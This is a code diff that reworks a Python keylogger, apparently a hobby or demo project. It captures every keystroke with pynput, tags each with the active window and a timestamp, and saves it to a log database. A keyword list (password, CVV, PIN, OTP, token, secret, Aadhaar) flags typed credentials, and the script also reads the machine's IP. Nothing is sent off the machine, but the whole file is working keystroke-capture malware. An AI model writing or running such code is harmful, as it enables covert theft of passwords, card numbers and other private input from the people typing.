@@ -1,66 +1,94 @@
-import logging
-from pynput.keyboard import Key, Listener
-import socket
-import subprocess
-import time
+from pynput.keyboard import Listener, Key
+import socket, subprocess, time, platform
+from datetime import datetime
+from logger_utils import init_db, insert_log
 
-log_file = "keylog.txt"
-log_dir = ""
+# --- Initialize DB ---
+init_db()
 
+# --- Get IP Address ---
 def get_ip_address():
     try:
-        # Connect to a public DNS server to get the correct IP (handles external IP better)
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))  # Connecting to a public DNS server
+        s.connect(("8.8.8.8", 80))
         ip_address = s.getsockname()[0]
         s.close()
         return ip_address
-    except Exception as e:
-        return "Unable to get IP: " + str(e)
+    except:
+        return "Unknown"
 
+# --- Get Active Window (Cross-Platform) ---
 def get_active_window():
     try:
-        script = 'tell application "System Events" to get name of application processes whose frontmost is true'
-        active_window_name = subprocess.run(['osascript', '-e', script], capture_output=True, text=True)
-        if active_window_name.returncode == 0:
-            return active_window_name.stdout.strip()
-        else:
-            return "Unknown Application"
-    except Exception as e:
-        return "Error retrieving window: " + str(e)
+        system = platform.system()
+        if system == "Darwin":  # macOS
+            script = 'tell application "System Events" to get name of application processes whose frontmost is true'
+            result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True)
+            return result.stdout.strip()
+        elif system == "Windows":
+            import win32gui
+            window = win32gui.GetForegroundWindow()
+            return win32gui.GetWindowText(window)
+        elif system == "Linux":
+            result = subprocess.run(['xdotool', 'getactivewindow', 'getwindowname'],
+                                    capture_output=True, text=True)
+            return result.stdout.strip()
+    except:
+        return "Unknown App"
 
-logging.basicConfig(filename=(log_dir + log_file), 
-                    level=logging.DEBUG, 
-                    format='%(asctime)s: [%(message)s]')
+# --- Sensitive Keywords ---
+SENSITIVE_KEYWORDS = [  "password", "pass", "login", "signin", "user", "username",
+    "card", "credit", "debit", "cvv", "pin", "upi", "bank", "account",
+    "email", "phone", "mobile", "aadhaar",
+    "otp", "token", "key", "secret"]
 
-logging.info(f"Logging started on system with IP: {get_ip_address()}")
+# --- Typing Anomaly Detection ---
+last_time = time.time()
+def detect_anomaly():
+    global last_time
+    current_time = time.time()
+    interval = current_time - last_time
+    last_time = current_time
+    if interval < 0.05:  # suspiciously fast typing
+        return True
+    return False
 
+# --- Key Press Event ---
 def on_press(key):
     try:
-        window_title = get_active_window()
-        logging.info(f"{window_title} | {key.char}")
-    except AttributeError:
-        window_title = get_active_window()
-        logging.info(f"{window_title} | {str(key)}")
+        app = get_active_window()
+        k = key.char if hasattr(key, 'char') and key.char else str(key)
+        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
+        insert_log(ts, app, k)  # Save encrypted log
 
+        print(f"[LOG] {app} | {k}")  # Debug print
+
+        # Alerts
+        if any(word in k.lower() for word in SENSITIVE_KEYWORDS):
+            print(f"[ALERT] Sensitive keyword typed in {app} at {ts}")
+        if detect_anomaly():
+            print(f"[ANOMALY] Suspicious typing detected in {app} at {ts}")
+
+        # Exit on Esc
+        if key == Key.esc:
+            print("[INFO] Exiting keylogger...")
+            return False
+
+    except Exception as e:
+        print("Error logging:", e)
+
+# --- Start Listener ---
 def start_keylogger():
+    print(f"[INFO] Keylogger started on system with IP: {get_ip_address()}")
     with Listener(on_press=on_press) as listener:
         listener.join()
 
-# Main function to ask for username
-def main():
+if __name__ == "__main__":
+    print(">>> Entered __main__ block")
     username = input("Enter username: ")
-
-    # Check if the username is 'SALMAN'
-    if username == "SALMAN":
+    if username.strip().lower() == "salman":
         print("Access granted. Starting keylogger...")
         start_keylogger()
     else:
-        print("Access denied. Exiting...")
-
-# Run the keylogger only if the correct username is provided
-if __name__ == "__main__":
-    main()
-
-
+        print("Access denied.")
